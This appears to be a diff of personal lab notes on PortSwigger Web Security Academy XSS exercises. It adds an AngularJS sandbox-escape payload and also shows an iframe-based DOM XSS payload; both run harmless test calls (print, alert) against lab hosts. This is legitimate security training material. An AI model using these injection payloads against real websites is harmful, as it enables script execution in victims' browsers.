@@ -46,3 +46,18 @@ Readings:
 
 ```<iframe src="https://ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
 
+<br>
+
+### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+```{{$on.constructor('alert(1)')()}}``` in search box and press the button "Search".
+
+<br>
+
+## Reflected DOM XSS
+
+
+
+
+
+
+
